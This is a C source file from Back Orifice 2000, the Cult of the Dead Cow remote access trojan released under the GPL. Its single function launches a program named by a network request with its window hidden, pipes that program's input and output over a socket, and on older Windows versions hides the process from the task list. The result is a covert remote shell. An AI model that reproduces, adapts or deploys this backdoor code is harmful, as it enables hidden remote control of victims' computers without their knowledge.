/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<osversion.h>
#include<iohandler.h>
#include<functions.h>
#include<cmd\cmd_tcpip.h>
#include<pviewer.h>

//typedef struct __port_child_param {
//	SOCKET s;
//	SOCKADDR_IN saddr;
//	BOOL *pbDone;
//	int nArg1;
//	char *svArg2;
//	char *svArg3;
//} PORT_CHILD_PARAM;

DWORD WINAPI PortAppThread(LPVOID lpParameter)
{
	PORT_CHILD_PARAM *ppcp=(PORT_CHILD_PARAM *) lpParameter;

	SECURITY_ATTRIBUTES sa;
	sa.bInheritHandle=TRUE;
	sa.lpSecurityDescriptor=NULL;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);

	// Create Pipe for server input <- network recv
	HANDLE hServerInputPipe,hNetworkRecvPipe;
	
	if(CreatePipe(&hServerInputPipe, &hNetworkRecvPipe, &sa, 0)==0) {
		closesocket(ppcp->s);
		free(ppcp);
		return 0;
	}

	// Create Pipe for server output -> network send
	HANDLE hServerOutputPipe,hNetworkSendPipe;
	if(CreatePipe(&hNetworkSendPipe, &hServerOutputPipe, &sa, 0)==0) {
		CloseHandle(hServerInputPipe);
		CloseHandle(hNetworkRecvPipe);
		closesocket(ppcp->s);
		free(ppcp);
		return 0;
	}
	
	// Start Application
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	memset(&si,0,sizeof(STARTUPINFO));

	si.cb=sizeof(STARTUPINFO);
	si.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;

	si.wShowWindow=SW_HIDE;
	si.hStdError=hServerOutputPipe;
	si.hStdInput=hServerInputPipe;
	si.hStdOutput=hServerOutputPipe;
	
	if(CreateProcess(NULL,ppcp->svArg2,NULL,NULL,TRUE,CREATE_SEPARATE_WOW_VDM,NULL,NULL,&si,&pi)==0) {
		CloseHandle(hServerInputPipe);
		CloseHandle(hNetworkRecvPipe);
		CloseHandle(hServerOutputPipe);
		CloseHandle(hNetworkSendPipe);
		closesocket(ppcp->s);
		free(ppcp);
		return 0;
	}

	if(!g_bIsWinNT) {
		// Hide redir32.exe if they exist
		pRegisterServiceProcess(pi.dwProcessId,1);
	}

	// Now we sit around and forward packets.
	
	DWORD dwLen,dwBytes;
	fd_set rfds;
	while(!*(ppcp->pbDone)) {
		// Check network socket
		Sleep(20);

		FD_ZERO(&rfds);
		FD_SET(ppcp->s,&rfds);
		TIMEVAL tm;
		tm.tv_sec=0;
		tm.tv_usec=0;
		if(select(0,&rfds,NULL,NULL,&tm)>0) {		
			if(FD_ISSET(ppcp->s,&rfds)) {
				ioctlsocket(ppcp->s,FIONREAD,&dwLen);
				if(dwLen<=0) {
					CloseHandle(hNetworkSendPipe);
					CloseHandle(hServerOutputPipe);
					CloseHandle(hNetworkRecvPipe);
					CloseHandle(hServerInputPipe);
			
					closesocket(ppcp->s);
					free(ppcp);
					return 0;
				}
				char *buffer=(char *)malloc(dwLen);
				if(buffer!=NULL) {
					dwLen=recv(ppcp->s,buffer,dwLen,0);
					if(dwLen>0) WriteFile(hNetworkRecvPipe,buffer,dwLen,&dwBytes,NULL);
					free(buffer);
				}
			}	
		}

		// Check handle
		PeekNamedPipe(hNetworkSendPipe,NULL,0,NULL,&dwLen,NULL);
		if(dwLen>0) {
			char *buffer=(char *)malloc(dwLen);
			if(buffer!=NULL) {
				ReadFile(hNetworkSendPipe,buffer,dwLen,&dwBytes,NULL);
				send(ppcp->s,buffer,dwBytes,0);
				free(buffer);
			}
		}

		// Check for death
		if(WaitForSingleObject(pi.hProcess,0)!=WAIT_TIMEOUT) break;
	}
	
	CloseHandle(hNetworkSendPipe);
	CloseHandle(hServerOutputPipe);
	CloseHandle(hNetworkRecvPipe);
	CloseHandle(hServerInputPipe);

	closesocket(ppcp->s);
	free(ppcp);
	return 0;
}

